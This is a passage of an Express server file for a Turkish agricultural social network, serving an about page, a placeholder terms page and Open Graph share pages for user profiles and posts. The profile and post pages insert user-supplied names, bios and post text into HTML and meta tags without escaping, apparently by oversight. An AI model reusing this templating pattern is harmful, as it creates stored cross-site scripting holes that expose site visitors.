<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f8fffe;color:#1a2e1a;line-height:1.7}header{background:linear-gradient(135deg,#00b894,#00a381);padding:16px 24px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100}header img{width:40px;height:40px;border-radius:10px}header h1{color:white;font-size:20px;font-weight:900}header a{color:rgba(255,255,255,.85);text-decoration:none;margin-left:auto;font-size:14px;font-weight:600;border:1px solid rgba(255,255,255,.4);padding:6px 14px;border-radius:20px}.hero{background:linear-gradient(160deg,#00b894 0%,#006d54 100%);color:white;padding:64px 24px 80px;text-align:center;position:relative}.hero::after{content:'';position:absolute;bottom:-2px;left:0;right:0;height:50px;background:#f8fffe;clip-path:ellipse(55% 100% at 50% 100%)}.hero h2{font-size:clamp(28px,6vw,48px);font-weight:900;margin-bottom:16px}.hero p{font-size:18px;opacity:.9;max-width:600px;margin:0 auto}.container{max-width:860px;margin:0 auto;padding:48px 24px}section{background:white;border-radius:20px;padding:36px;margin-bottom:28px;box-shadow:0 2px 16px rgba(0,0,0,.06);border:1px solid #e8f5f0}section h3{font-size:22px;font-weight:800;color:#00b894;margin-bottom:16px}section p,section li{color:#445544;font-size:16px;margin-bottom:10px}ul{padding-left:20px}.ig-btn{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);color:white;padding:14px 24px;border-radius:14px;text-decoration:none;font-weight:700;font-size:16px;margin-top:8px}.cta{background:linear-gradient(135deg,#00b894,#00a381);border-radius:20px;padding:40px;text-align:center;color:white}.cta h3{color:white;font-size:24px;margin-bottom:12px}.cta a{display:inline-block;background:white;color:#00b894;font-weight:800;padding:14px 32px;border-radius:50px;text-decoration:none;font-size:16px}footer{text-align:center;padding:32px 24px;color:#889988;font-size:13px;border-top:1px solid #e0ede8}footer a{color:#00b894;text-decoration:none}</style>
</head>
<body>
<header><img src="/agro.png" alt="Agro Sosyal" onerror="this.style.display='none'"><h1>Agro Sosyal</h1><a href="/">Ana Sayfa</a></header>
<div class="hero"><h2>Hakkimizda</h2><p>Turkiye'nin ciftci ve tarim sektoru icin gelistirilmis yerli sosyal medya platformu</p></div>
<div class="container">
<section><h3>Biz Kimiz?</h3><p><strong>Agro Sosyal</strong>, ciftciler, ureticiler, ziraat muhendisleri ve tarim sektoruyle ilgilenen kullanicilari bir araya getiren <strong>yerli bir dijital sosyal medya platformudur</strong>. Turkiye'de tarimin dijital donusumune onculuk etmek amaciyla 2024 yilinda kuruldu.</p></section>
<section><h3>Instagram</h3><p>Tarimsal icerikler, platform haberleri ve topluluk paylasimlari icin Instagram sayfamizi takip edin.</p><a href="https://www.instagram.com/agrososyal_official" target="_blank" rel="noopener noreferrer" class="ig-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>@agrososyal_official</a></section>
<section><h3>Misyonumuz</h3><p>Turkiye'deki milyonlarca ciftciyi ve tarim emekccisini dijital platformda bulustururak bilgi paylasimini, ticaret firsatlarini ve topluluk dayanismasini gucllendirmek.</p><ul><li>Ciftciler arasi bilgi ve deneyim paylasimini kolaylastirmak</li><li>Tarimsal urun ve hizmetler icin guvenli bir pazar alani olusturmak</li><li>Ziraat muhendisleri ile ciftcileri dogrudan bulustirmak</li></ul></section>
<section><h3>Iletisim & Linkler</h3><p><strong>Platform:</strong> <a href="${DOMAIN}" style="color:#00b894">${DOMAIN}</a></p><p><strong>Instagram:</strong> <a href="https://www.instagram.com/agrososyal_official" target="_blank" style="color:#e1306c">@agrososyal_official</a></p><p><strong>Gizlilik Politikasi:</strong> <a href="/kullanim" style="color:#00b894">${DOMAIN}/kullanim</a></p><p><strong>Kurulus Yili:</strong> 2024 | <strong>Dil:</strong> Turkce | <strong>Hizmet Alani:</strong> Turkiye</p></section>
<div class="cta"><h3>Hemen Katilin!</h3><p>Turkiye'nin ciftci sosyal medyasinda yerinizi alin. Ucretsiz kayit olun.</p><a href="/">Uygulamaya Git</a></div>
</div>
<footer><p>&copy; 2024 Agro Sosyal. | <a href="/">Ana Sayfa</a> | <a href="/hakkimizda">Hakkimizda</a> | <a href="/kullanim">Kullanim & Gizlilik</a></p></footer>
</body></html>`);
});

// ═══════════════════════════════════════════════════════
// 📄 KULLANIM & GİZLİLİK POLİTİKASI — /kullanim
// ✅ public/kullanim.html oluştur → kendi HTML'in otomatik açılır
// ═══════════════════════════════════════════════════════
app.get('/kullanim', (req, res) => {
    // ✅ Sen public/kullanim.html dosyasını oluşturursan BURASI AÇILIR
    const customPath = path.join(__dirname, 'public', 'kullanim.html');
    if (fssync.existsSync(customPath)) return res.sendFile(customPath);
    // Henüz oluşturulmamışsa geçici placeholder
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.setHeader('Cache-Control', 'public, max-age=3600');
    res.type('html').send(`<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Kullanim Kosullari & Gizlilik Politikasi | Agro Sosyal</title>
<meta name="description" content="Agro Sosyal kullanim kosullari ve gizlilik politikasi.">
<meta name="robots" content="index, follow">
<link rel="canonical" href="${DOMAIN}/kullanim">
<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","name":"Kullanim Kosullari ve Gizlilik Politikasi","url":"${DOMAIN}/kullanim","description":"Agro Sosyal platformu kullanim kosullari ve gizlilik politikasi.","inLanguage":"tr-TR","isPartOf":{"@type":"WebSite","name":"Agro Sosyal","url":"${DOMAIN}"}}<\/script>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:#f8fffe;color:#1a2e1a;display:flex;flex-direction:column;min-height:100vh;align-items:center;justify-content:center;text-align:center;padding:40px 24px}.card{background:white;border-radius:24px;padding:48px 40px;max-width:480px;box-shadow:0 4px 24px rgba(0,0,0,.08);border:1px solid #e8f5f0}.icon{font-size:64px;margin-bottom:20px}h1{color:#00b894;font-size:22px;margin-bottom:12px}p{color:#667766;font-size:15px;margin-bottom:20px;line-height:1.6}.badge{display:inline-block;background:#f0faf7;color:#00b894;border:1px solid #c3e8de;border-radius:20px;padding:6px 16px;font-size:13px;font-weight:600;margin-bottom:20px}a{display:inline-block;background:#00b894;color:white;font-weight:700;padding:12px 28px;border-radius:50px;text-decoration:none}</style>
</head>
<body>
<div class="card">
<div class="icon">📋</div>
<span class="badge">Hazirlanıyor</span>
<h1>Kullanim Kosullari & Gizlilik Politikasi</h1>
<p>Bu sayfa kısa süre içinde yayına girecek.<br><br><strong>Nasıl yayına girer?</strong><br>Sunucuda <code>public/kullanim.html</code> dosyasını oluştur — içerik otomatik olarak burada görünür.</p>
<a href="/">Ana Sayfaya Don</a>
</div>
</body></html>`);
});

app.get('/', (req, res) => {
    const htmlPath = path.join(__dirname, 'public', 'index.html');
    if (fssync.existsSync(htmlPath)) {
        // ⚠️ DUİZELME: Content-Type’ı açıkça text/html set et.
        // mobileKeyMiddleware veya başka bir middleware application/json
        // set etmiş olabilir; sendFile öncesi override et.
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.sendFile(htmlPath);
    } else {
        res.json({ message: 'AgroLink API Server', status: 'running' });
    }
});

// ══════════════════════════════════════════════════════════════════════
// 🌐 OG (OPEN GRAPH) ROTALARI
// WhatsApp, Instagram, Twitter/X, Facebook paylaşım önizlemeleri için
// Bots bu sayfalara gelince zengin meta etiketlerini okur
// ══════════════════════════════════════════════════════════════════════

// ──────────────────────────────────────────────────────────────────────
// Bot algılama yardımcı fonksiyonu
// WhatsApp, Facebook, Twitter, Telegram, LinkedIn gibi link önizleyicileri
// bot olarak tanınır → OG meta HTML döndürülür.
// Gerçek tarayıcılar → SPA (index.html) döndürülür, URL korunur.
// ──────────────────────────────────────────────────────────────────────
function isSocialBot(req) {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    return (
        ua.includes('facebookexternalhit') ||
        ua.includes('facebot')             ||
        ua.includes('twitterbot')          ||
        ua.includes('whatsapp')            ||
        ua.includes('telegrambot')         ||
        ua.includes('linkedinbot')         ||
        ua.includes('slackbot')            ||
        ua.includes('discordbot')          ||
        ua.includes('applebot')            ||
        ua.includes('googlebot')           ||
        ua.includes('bingbot')             ||
        ua.includes('ia_archiver')         ||
        ua.includes('embedly')             ||
        ua.includes('quora link preview')  ||
        ua.includes('outbrain')            ||
        ua.includes('pinterest')           ||
        ua.includes('vkshare')             ||
        ua.includes('w3c_validator')
    );
}

// Kullanıcı profili OG sayfası: /u/:username
// Bot ise OG meta HTML döndür (WhatsApp/Twitter önizlemesi için)
// İnsan ise SPA'yı döndür, frontend URL'i okuyup profili açar
app.get('/u/:usernameOrId', async (req, res) => {
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    try {
        const param  = req.params.usernameOrId?.trim();
        if (!param) return res.redirect('/');

        // UUID mi yoksa username mi?
        const isUUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(param);

        const user = await dbGet(
            isUUID
                ? `SELECT id, username, name, bio, "profilePic", "coverPic", "isVerified", "hasFarmerBadge", "userType",
                          (SELECT COUNT(*)::int FROM follows WHERE "followingId"=u.id) AS "followerCount",
                          (SELECT COUNT(*)::int FROM posts WHERE "userId"=u.id AND "isActive"=TRUE) AS "postCount"
                   FROM users u WHERE id=$1 AND "isActive"=TRUE LIMIT 1`
                : `SELECT id, username, name, bio, "profilePic", "coverPic", "isVerified", "hasFarmerBadge", "userType",
                          (SELECT COUNT(*)::int FROM follows WHERE "followingId"=u.id) AS "followerCount",
                          (SELECT COUNT(*)::int FROM posts WHERE "userId"=u.id AND "isActive"=TRUE) AS "postCount"
                   FROM users u WHERE LOWER(username)=$1 AND "isActive"=TRUE LIMIT 1`,
            [isUUID ? param : param.toLowerCase()]
        ).catch(() => null);

        if (!user) {
            return res.status(404).send(`<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8">
<title>Kullanıcı Bulunamadı • AgroLink</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#060d0a;color:#e8f5e9;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{text-align:center;padding:40px}.logo{font-size:28px;font-weight:800;color:#00e676;margin-bottom:16px}
p{color:rgba(255,255,255,0.5);margin-bottom:24px}a{display:inline-block;padding:12px 28px;background:#00e676;color:#020810;border-radius:50px;text-decoration:none;font-weight:700}</style>
</head><body><div class="box"><div class="logo">🌾 AgroLink</div><h2>Kullanıcı bulunamadı</h2>
<p>Bu profil mevcut değil veya silinmiş olabilir.</p><a href="${DOMAIN}">Ana Sayfaya Dön</a></div></body></html>`);
        }

        const title      = `${user.name || user.username} (@${user.username}) • AgroLink`;
        const desc       = `${user.bio ? user.bio.substring(0,150) + ' · ' : ''}${user.followerCount||0} takipçi · ${user.postCount||0} gönderi · AgroLink Tarım Topluluğu`;
        const imgUrl     = user.profilePic ? (user.profilePic.startsWith('http') ? user.profilePic : DOMAIN + user.profilePic) : `${DOMAIN}/agro.png`;
        const coverUrl   = user.coverPic   ? (user.coverPic.startsWith('http')   ? user.coverPic   : DOMAIN + user.coverPic)   : null;
        const pageUrl    = `${DOMAIN}/u/${user.username}`;
        const badge      = user.isVerified ? ' ✓' : '';
        const userTypeTr = user.userType === 'ciftci_hayvancilik' ? '👨‍🌾 Çiftçi' : user.userType === 'ziraat_muhendisi' ? '🔬 Ziraat Müh.' : user.userType === 'tarim_ogretmeni' ? '📚 Öğretmen' : '🌱 Üye';

        const recentPosts = await dbAll(
            `SELECT id, content, "mediaUrls", "mediaType", "likeCount", "commentCount" FROM posts WHERE "userId"=$1 AND "isActive"=TRUE ORDER BY "createdAt" DESC LIMIT 6`,
            [user.id]
        ).catch(() => []);

        const postsHtml = (recentPosts || []).map(p => {
            let mediaSrc = null;
            if (p.mediaUrls) {
                try {
                    const arr = typeof p.mediaUrls === 'string' ? JSON.parse(p.mediaUrls) : p.mediaUrls;
                    const first = arr?.[0];
                    mediaSrc = first?.url || (typeof first === 'string' ? first : null);
                    if (mediaSrc && !mediaSrc.startsWith('http')) mediaSrc = DOMAIN + mediaSrc;
                } catch {}
            }
            const mediaHtml = mediaSrc && p.mediaType !== 'video'
                ? `<img src="${mediaSrc}" alt="gönderi" style="width:100%;height:150px;object-fit:cover">`
                : mediaSrc ? `<div style="background:#0a1f10;height:150px;display:flex;align-items:center;justify-content:center;font-size:36px">▶️</div>` : '';
            const txt = (p.content||'').substring(0,80) + ((p.content||'').length>80?'...':'');
            return `<a href="${DOMAIN}/p/${p.id}" style="text-decoration:none;display:block;background:#0d1f14;border:1px solid rgba(0,230,118,0.1);border-radius:12px;overflow:hidden">
${mediaHtml}<div style="padding:10px">${txt?`<p style="color:#e8f5e9;font-size:13px;margin-bottom:6px">${txt}</p>`:''}<span style="color:#00e676;font-size:12px">❤️ ${p.likeCount||0} 💬 ${p.commentCount||0}</span></div></a>`;
        }).join('');

        res.setHeader('Cache-Control', 'public, max-age=120');
        res.type('html').send(`<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${title}${badge}</title>
<meta name="description" content="${desc}">
<meta property="og:type" content="profile">
<meta property="og:site_name" content="AgroLink">
<meta property="og:title" content="${title}${badge}">
<meta property="og:description" content="${desc}">
<meta property="og:image" content="${imgUrl}">
<meta property="og:image:width" content="400">
<meta property="og:image:height" content="400">
<meta property="og:url" content="${pageUrl}">
<meta property="og:locale" content="tr_TR">
<meta property="profile:username" content="${user.username}">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="${title}">
<meta name="twitter:description" content="${desc}">
<meta name="twitter:image" content="${imgUrl}">
<link rel="canonical" href="${pageUrl}">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#060d0a;color:#e8f5e9;min-height:100vh}
.cover{width:100%;height:180px;object-fit:cover;background:linear-gradient(135deg,#0a1f10,#0d2b16);display:block}
.container{max-width:640px;margin:0 auto;padding:0 16px 48px}
.card{background:#0d1a12;border:1px solid rgba(0,230,118,0.12);border-radius:20px;padding:20px;margin-top:-36px;position:relative}
.avatar{width:84px;height:84px;border-radius:50%;border:3px solid #00e676;object-fit:cover;background:#0a1f10;display:block}
.name{font-size:21px;font-weight:800;margin-top:10px}
.uname{color:#00e676;font-size:14px;margin:2px 0 8px}
.typebadge{display:inline-block;background:rgba(0,230,118,0.1);color:#00e676;border:1px solid rgba(0,230,118,0.25);border-radius:20px;padding:3px 10px;font-size:12px;margin-bottom:10px}
.bio{color:rgba(255,255,255,0.6);font-size:14px;line-height:1.6;margin-bottom:14px}
.stats{display:flex;gap:28px;margin-bottom:18px}
.stat-num{font-size:19px;font-weight:800;color:#00e676}.stat-label{font-size:11px;color:rgba(255,255,255,0.4)}
.cta{display:inline-block;padding:11px 28px;background:linear-gradient(135deg,#00e676,#1de9b6);color:#020810;font-weight:800;border-radius:50px;text-decoration:none;font-size:14px}
.sec{font-size:15px;font-weight:700;color:#00e676;margin:24px 0 10px;border-bottom:1px solid rgba(0,230,118,0.12);padding-bottom:7px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px}
.foot{text-align:center;margin-top:28px;color:rgba(255,255,255,0.2);font-size:12px}
.foot span{color:#00e676;font-weight:700}</style>
</head>
<body>
${coverUrl ? `<img class="cover" src="${coverUrl}" alt="kapak">` : '<div class="cover"></div>'}
<div class="container">
  <div class="card">
    <img class="avatar" src="${imgUrl}" alt="${user.name}" onerror="this.src='${DOMAIN}/agro.png'">
    <div class="name">${user.name||user.username}${badge}</div>
    <div class="uname">@${user.username}</div>
    <span class="typebadge">${userTypeTr}</span>
    ${user.bio ? `<p class="bio">${user.bio}</p>` : ''}
    <div class="stats">
      <div><div class="stat-num">${user.postCount||0}</div><div class="stat-label">Gönderi</div></div>
      <div><div class="stat-num">${user.followerCount||0}</div><div class="stat-label">Takipçi</div></div>
    </div>
    <a class="cta" href="${DOMAIN}">📱 AgroLink'te Aç</a>
  </div>
  ${recentPosts.length > 0 ? `<div class="sec">Son Gönderiler</div><div class="grid">${postsHtml}</div>` : ''}
  <div class="foot">🌾 <span>AgroLink</span> — Tarım Topluluğu</div>
</div>
</body></html>`);
    } catch (e) {
        console.error('[PROFİL SAYFASI] Hata:', e.message);
        res.redirect('/');
    }
});

// Gönderi paylaşım sayfası: /post/:postId (tam handler — redirect değil, direkt HTML)
app.get('/post/:postId', async (req, res) => {
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    try {
        const postId = req.params.postId?.trim();
        if (!postId) return res.redirect('/');

        const post = await dbGet(
            `SELECT p.id, p.content, p.media, p."mediaType", p."mediaUrls",
                    p."likeCount", p."commentCount", p."createdAt",
                    u.name, u.username, u."profilePic", u."isVerified"
             FROM posts p JOIN users u ON p."userId"=u.id
             WHERE p.id=$1 AND p."isActive"=TRUE LIMIT 1`,
            [postId]
        ).catch(() => null);

        if (!post) {
            return res.status(404).send(`<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8">
<title>Gönderi Bulunamadı • AgroLink</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#060d0a;color:#e8f5e9;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{text-align:center;padding:40px}.logo{font-size:28px;font-weight:800;color:#00e676;margin-bottom:16px}
p{color:rgba(255,255,255,0.5);margin-bottom:24px}a{display:inline-block;padding:12px 28px;background:#00e676;color:#020810;border-radius:50px;text-decoration:none;font-weight:700}
</style></head><body><div class="box"><div class="logo">🌾 AgroLink</div><h2>Gönderi bulunamadı</h2>
<p>Bu gönderi silinmiş veya mevcut değil.</p><a href="${DOMAIN}">Ana Sayfaya Dön</a></div></body></html>`);
        }

        let mediaItems = [];
        if (post.mediaUrls) {
            try {
                const arr = typeof post.mediaUrls === 'string' ? JSON.parse(post.mediaUrls) : post.mediaUrls;
                mediaItems = (arr||[]).map(item => {
                    const url = item?.url || (typeof item === 'string' ? item : null);
                    if (!url) return null;
                    return { url: url.startsWith('http') ? url : DOMAIN + url, type: item?.type || post.mediaType || 'image' };
                }).filter(Boolean);
            } catch {}
        }
        if (!mediaItems.length && post.media)
            mediaItems = [{ url: post.media.startsWith('http') ? post.media : DOMAIN + post.media, type: post.mediaType || 'image' }];

        const profPic  = post.profilePic ? (post.profilePic.startsWith('http') ? post.profilePic : DOMAIN + post.profilePic) : `${DOMAIN}/agro.png`;
        const first    = mediaItems[0];
        const ogImg    = (first?.type === 'image' ? first.url : null) || profPic;
        const title    = `${post.name || post.username} (@${post.username}) • AgroLink`;
        const rawDesc  = (post.content||'').replace(/<[^>]*>/g,'').substring(0,200);
        const desc     = rawDesc || 'AgroLink Tarım Topluluğu paylaşımı';
        const pageUrl  = `${DOMAIN}/post/${post.id}`;
        const profUrl  = `${DOMAIN}/u/${post.username}`;
        const badge    = post.isVerified ? ' ✓' : '';
        const diff     = Date.now() - new Date(post.createdAt).getTime();
        const m        = Math.floor(diff/60000);
        const timeAgo  = m<1?'Az önce':m<60?m+' dk önce':m<1440?Math.floor(m/60)+' saat önce':Math.floor(m/1440)+' gün önce';
        const mediaHtml = mediaItems.map(item =>
            item.type==='video'
            ? `<video controls style="width:100%;max-height:480px;background:#000;display:block" src="${item.url}"></video>`
            : `<img src="${item.url}" alt="görsel" style="width:100%;display:block;max-height:580px;object-fit:cover">`
        ).join('');

        res.setHeader('Cache-Control', 'public, max-age=120');
        res.type('html').send(`<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${title}</title>
<meta name="description" content="${desc}">
<meta property="og:type" content="article">
<meta property="og:site_name" content="AgroLink">
<meta property="og:title" content="${title}">
<meta property="og:description" content="${desc}">
<meta property="og:image" content="${ogImg}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="${pageUrl}">
<meta property="og:locale" content="tr_TR">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${title}">
<meta name="twitter:description" content="${desc}">
<meta name="twitter:image" content="${ogImg}">
<link rel="canonical" href="${pageUrl}">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#060d0a;color:#e8f5e9;min-height:100vh}
.wrap{max-width:600px;margin:0 auto;padding:16px 16px 56px}
.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
.brand{font-size:21px;font-weight:800;color:#00e676}
.card{background:#0d1a12;border:1px solid rgba(0,230,118,0.12);border-radius:20px;overflow:hidden}
.author{display:flex;align-items:center;gap:12px;padding:14px 16px}
.avatar{width:44px;height:44px;border-radius:50%;object-fit:cover;border:2px solid #00e676;flex-shrink:0}
.aname{font-weight:700;font-size:15px;color:#e8f5e9}
.ausr{color:#00e676;font-size:13px}
.media-wrap{overflow:hidden}
.body{padding:14px 16px;font-size:15px;line-height:1.65;color:#e8f5e9;white-space:pre-wrap;word-break:break-word}
.stats{display:flex;gap:20px;padding:10px 16px;border-top:1px solid rgba(0,230,118,0.08);color:rgba(255,255,255,0.45);font-size:13px}
.stats strong{color:#e8f5e9}
.time{padding:4px 16px 14px;color:rgba(255,255,255,0.3);font-size:12px}
.cta-area{text-align:center;margin-top:20px}
.cta{display:inline-block;padding:13px 32px;background:linear-gradient(135deg,#00e676,#1de9b6);color:#020810;font-weight:800;border-radius:50px;text-decoration:none;font-size:15px}
.foot{text-align:center;margin-top:24px;color:rgba(255,255,255,0.2);font-size:12px}
.foot span{color:#00e676;font-weight:700}</style>
</head>
<body>
<div class="wrap">
  <div class="topbar">
    <div class="brand">🌾 AgroLink</div>
    <a href="${DOMAIN}" style="color:#00e676;font-size:13px;text-decoration:none">Ana Sayfa →</a>
  </div>
  <div class="card">
    <a href="${profUrl}" style="text-decoration:none">
      <div class="author">
        <img class="avatar" src="${profPic}" alt="${post.name}" onerror="this.src='${DOMAIN}/agro.png'">
        <div><div class="aname">${post.name||post.username}${badge}</div><div class="ausr">@${post.username}</div></div>
      </div>
    </a>
    ${mediaHtml ? `<div class="media-wrap">${mediaHtml}</div>` : ''}
    ${post.content ? `<div class="body">${(post.content||'').replace(/<[^>]*>/g,'')}</div>` : ''}
    <div class="stats">
      <div>❤️ <strong>${post.likeCount||0}</strong></div>
      <div>💬 <strong>${post.commentCount||0}</strong></div>
    </div>
    <div class="time">${timeAgo}</div>
  </div>
  <div class="cta-area"><a class="cta" href="${DOMAIN}">📱 AgroLink'te Aç</a></div>
  <div class="foot">🌾 <span>AgroLink</span> — Tarım Topluluğu</div>
</div>
</body></html>`);
    } catch (e) {
        console.error('[POST SAYFASI /post/] Hata:', e.message);
        res.redirect('/');
    }
});

// Gönderi paylaşım sayfası: /p/:postId
app.get('/p/:postId', async (req, res) => {
    const DOMAIN = process.env.APP_URL || 'https://sehitumitkestitarimmtal.com';
    try {
        const postId = req.params.postId?.trim();
        if (!postId) return res.redirect('/');

        const post = await dbGet(
            `SELECT p.id, p.content, p.media, p."mediaType", p."mediaUrls",
                    p."likeCount", p."commentCount", p."createdAt",
                    u.name, u.username, u."profilePic", u."isVerified"
             FROM posts p JOIN users u ON p."userId"=u.id
             WHERE p.id=$1 AND p."isActive"=TRUE LIMIT 1`,
            [postId]
        ).catch(() => null);

        if (!post) {
            return res.status(404).send(`<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8">
<title>Gönderi Bulunamadı • AgroLink</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#060d0a;color:#e8f5e9;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{text-align:center;padding:40px}.logo{font-size:28px;font-weight:800;color:#00e676;margin-bottom:16px}
p{color:rgba(255,255,255,0.5);margin-bottom:24px}a{display:inline-block;padding:12px 28px;background:#00e676;color:#020810;border-radius:50px;text-decoration:none;font-weight:700}
</style></head><body><div class="box"><div class="logo">🌾 AgroLink</div><h2>Gönderi bulunamadı</h2>
<p>Bu gönderi silinmiş veya mevcut değil.</p><a href="${DOMAIN}">Ana Sayfaya Dön</a></div></body></html>`);
        }

        let mediaItems = [];
        if (post.mediaUrls) {
            try {
                const arr = typeof post.mediaUrls === 'string' ? JSON.parse(post.mediaUrls) : post.mediaUrls;
                mediaItems = (arr||[]).map(item => {
                    const url = item?.url || (typeof item === 'string' ? item : null);
                    if (!url) return null;
                    return { url: url.startsWith('http') ? url : DOMAIN + url, type: item?.type || post.mediaType || 'image' };
                }).filter(Boolean);
            } catch {}
        }
        if (!mediaItems.length && post.media)
            mediaItems = [{ url: post.media.startsWith('http') ? post.media : DOMAIN + post.media, type: post.mediaType || 'image' }];

        const profPic  = post.profilePic ? (post.profilePic.startsWith('http') ? post.profilePic : DOMAIN + post.profilePic) : `${DOMAIN}/agro.png`;
        const first    = mediaItems[0];
        const ogImg    = (first?.type === 'image' ? first.url : null) || profPic;
        const title    = `${post.name || post.username} (@${post.username}) • AgroLink`;
        const rawDesc  = (post.content||'').replace(/<[^>]*>/g,'').substring(0,200);
        const desc     = rawDesc || 'AgroLink Tarım Topluluğu paylaşımı';
        const pageUrl  = `${DOMAIN}/p/${post.id}`;
        const profUrl  = `${DOMAIN}/u/${post.username}`;
        const badge    = post.isVerified ? ' ✓' : '';
        const diff     = Date.now() - new Date(post.createdAt).getTime();
        const m        = Math.floor(diff/60000);
        const timeAgo  = m<1?'Az önce':m<60?m+' dk önce':m<1440?Math.floor(m/60)+' saat önce':Math.floor(m/1440)+' gün önce';
        const mediaHtml = mediaItems.map(item =>
            item.type==='video'
            ? `<video controls style="width:100%;max-height:480px;background:#000;display:block" src="${item.url}"></video>`
            : `<img src="${item.url}" alt="görsel" style="width:100%;display:block;max-height:580px;object-fit:cover">`
        ).join('');

        res.setHeader('Cache-Control', 'public, max-age=120');
        res.type('html').send(`<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${title}</title>
<meta name="description" content="${desc}">
<meta property="og:type" content="article">
<meta property="og:site_name" content="AgroLink">
<meta property="og:title" content="${title}">
<meta property="og:description" content="${desc}">
<meta property="og:image" content="${ogImg}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="${pageUrl}">
<meta property="og:locale" content="tr_TR">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${title}">
<meta name="twitter:description" content="${desc}">
<meta name="twitter:image" content="${ogImg}">
<link rel="canonical" href="${pageUrl}">
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Arial,sans-serif;background:#060d0a;color:#e8f5e9;min-height:100vh}
.wrap{max-width:600px;margin:0 auto;padding:16px 16px 56px}
.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
.brand{font-size:21px;font-weight:800;color:#00e676}
.card{background:#0d1a12;border:1px solid rgba(0,230,118,0.12);border-radius:20px;overflow:hidden}
.author{display:flex;align-items:center;gap:12px;padding:14px 16px}
.avatar{width:44px;height:44px;border-radius:50%;object-fit:cover;border:2px solid #00e676;flex-shrink:0}
.aname{font-weight:700;font-size:15px;color:#e8f5e9}
.ausr{color:#00e676;font-size:13px}
.media-wrap{overflow:hidden}
.body{padding:14px 16px;font-size:15px;line-height:1.65;color:#e8f5e9;white-space:pre-wrap;word-break:break-word}
.stats{display:flex;gap:20px;padding:10px 16px;border-top:1px solid rgba(0,230,118,0.08);color:rgba(255,255,255,0.45);font-size:13px}
.stats strong{color:#e8f5e9}
.time{padding:4px 16px 14px;color:rgba(255,255,255,0.3);font-size:12px}
.cta-area{text-align:center;margin-top:20px}
.cta{display:inline-block;padding:13px 32px;background:linear-gradient(135deg,#00e676,#1de9b6);color:#020810;font-weight:800;border-radius:50px;text-decoration:none;font-size:15px}
